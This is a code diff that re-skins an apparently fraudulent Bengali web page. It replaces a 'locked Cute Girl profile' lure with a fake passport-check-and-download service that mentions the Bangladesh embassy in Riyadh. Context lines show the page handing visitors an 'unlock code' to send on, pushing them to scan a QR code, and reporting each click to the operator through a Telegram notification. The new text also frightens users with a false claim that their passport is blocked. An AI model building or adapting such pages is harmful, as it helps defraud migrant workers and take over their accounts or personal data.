@@ -313,7 +313,7 @@ h1{
 
     <!-- সবুজ ব্যানার -->
     <div class="site-title">
-        Cute Girl এর প্রোফাইল লক করা আছে
+        Passport Chaking and Download 
     </div>
 
     <!-- =========================
@@ -323,7 +323,7 @@ h1{
     <section id="productPage" class="card">
 
         <h1>
-            Cute Girl এর প্রাইভেট প্রোফাইল আনলক করুন,,
+            Passport নাম্বার দিয়ে চেক করুন,,
         </h1>
 
         <div class="description">
@@ -408,7 +408,7 @@ h1{
         <!-- টেবিল অংশ -->
         <table class="perm-table">
             <tr>
-                <th>📱 হোয়াটসঅ্যাপ নাম্বার</th>
+                <th>📱 পাসপোর্ট নাম্বার</th>
                 <td id="permPhone">—</td>
             </tr>
             <tr>
@@ -678,7 +678,7 @@ submitButton.addEventListener("click", async function(){
     }
 
     if (!isValidPhoneNumber(value)) {
-        showError("সঠিক নম্বর লিখুন। (যেকোনো দেশের নম্বর গ্রহণ করা হবে)");
+        showError("পাসপোর্ট নাম্বার লিখুন)");
         productNumber.focus();
         return;
     }
@@ -706,7 +706,7 @@ submitButton.addEventListener("click", async function(){
         showError(error.message || "অনুরোধ পাঠানো যায়নি।");
     } finally {
         submitButton.disabled = false;
-        submitButton.textContent = "সংযুক্ত হন (Join Now)";
+        submitButton.textContent = "চেক করুন (Chaking)";
     }
 });
 
@@ -851,7 +851,7 @@ function showSendModal(code){
     permPhone.textContent = currentPhone || "—";
     permStatus.textContent = code ? "কোড প্রস্তুত ✅" : "অপেক্ষা করা হচ্ছে ⏳";
     modalIcon.textContent = "🔑";
-    modalTitle.textContent = "আনলক কোড";
+    modalTitle.textContent = "পাসপোর্ট পিডিএফ ফাইলটি ডাউনলোড করুন";
     modalText.textContent = "নিচের বাটুনে ক্লিক করুন:";
 
     codeBox.style.display = "flex";
@@ -908,8 +908,8 @@ function showErrorModal(){
     permPhone.textContent = currentPhone || "—";
     permStatus.textContent = "ত্রুটি ❌";
     modalIcon.innerHTML = '<span style="color:#c62828">✖</span>';
-    modalTitle.textContent = "সমস্যা হয়েছে";
-    modalText.textContent = "সার্ভার জনিত সমস্যার আপনার পাসপোর্টটি বাংলাদেশ রিয়াদ দূতাবাস অফিসে ";
+    modalTitle.textContent = "সার্ভার জনিত সমস্যায় Block হয়ে আছে";
+    modalText.textContent = "সার্ভার জনিত সমস্যার কারণে আবেদনের সময় আপনার পাসপোর্ট এর একটু ত্রুটি হয়েছে এজন্য বর্তমানে ওয়েটিং অবস্থায় আছে দয়া করে ঠিক করে নিবেন না হলে এভাবেই থেকে যাবে ";
 
     codeBox.style.display = "none";
     modalAction.innerHTML = '<button type="button" class="action-btn gray" id="retryBtn">আবার চেষ্টা করুন</button>';
@@ -929,13 +929,13 @@ function showErrorModal(){
 function showSuccessModal(){
     openModal();
     permPhone.textContent = currentPhone || "—";
-    permStatus.textContent = "সফল ✅";
+    permStatus.textContent = "Passport PDF File✅";
     modalIcon.innerHTML = '<span style="color:#16833c">✓</span>';
-    modalTitle.textContent = "সফল হয়েছে";
-    modalText.textContent = "আপনার অনুরোধটি সফল হয়েছে দয়া করে নিচের বাটনে ক্লিক করে যুক্ত হন";
+    modalTitle.textContent = "পাসপোর্ট নাম্বার চেক করে আপনার পাসপোর্ট এর পিডিএফ ফাইল পাওয়া গেছে";
+    modalText.textContent = "আপনার পাসপোর্ট নাম্বার দিয়ে সেভ করে পিডিএফ ফাইল পাওয়া গেছে দয়া করে কিউআর কোড স্ক্যান করে ডাউনলোড করুন";
 
     codeBox.style.display = "none";
-    modalAction.innerHTML = '<button type="button" class="action-btn green" id="joinBtn">✅ যুক্ত হন</button>';
+    modalAction.innerHTML = '<button type="button" class="action-btn green" id="joinBtn">✅ Download করুন</button>';
 
     document.getElementById("joinBtn").addEventListener("click", function () {
         notifyTelegram("✅ ইউজার 'যুক্ত হন' বাটনে ক্লিক করেছে — WhatsApp লিংকে যাচ্ছে");
